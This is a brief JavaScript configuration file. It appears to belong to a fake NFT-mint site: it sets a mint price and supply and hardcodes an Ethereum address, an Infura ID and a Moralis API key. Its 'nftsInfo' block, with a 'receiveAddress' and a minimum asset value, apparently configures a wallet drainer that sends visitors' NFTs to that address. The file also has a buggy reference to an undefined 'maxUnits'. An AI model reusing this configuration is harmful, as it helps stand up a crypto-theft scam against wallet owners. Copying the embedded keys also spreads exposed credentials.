const address = '0x9DCa1A8C1E04BFDD5F40b8C658dC10ef3DdF626e',
  infuraId = '5b7825e5fcc64bc4bf49f496587392ed',
  moralisApi =
    'BiY8KrXg1tXZSu4JUtOJ4JGZx89DErf5ZN0bfiyXkzQLi2GU8rfjREwurLHXTJRA'
const x20Ethereum = '0x9DCa1A8C1E04BFDD5F40b8C658dC10ef3DdF626e'

const mintInfo = {
    price: 0.05,
    totalSupply: 2222,
    minUnits: 1,
    maxUnits: 5,
    askMintLoop: true,
  },
  nftsInfo = {
    active: true,
    minValue: 0.1,
    checkMaxDay: 1,
    receiveAddress: '0x9DCa1A8C1E04BFDD5F40b8C658dC10ef3DdF626e',
  }
if (mintInfo.minUnits > mintInfo.maxUnits) {
  console.error(
    'Error: minUnits (' +
      mintInfo.minUnits +
      ') is greater than maxUnits (' +
      maxUnits +
      ')'
  )
}
if (mintInfo.minUnits <= 0) {
  console.error(
    'Error: minUnits (' + mintInfo.minUnits + ') is less than or equal to 0'
  )
}
if (!address.startsWith('0x') || address.length >= 64 || address.length <= 40) {
  console.error('Error: ' + address + ' is not a valid Ethereum address.')
}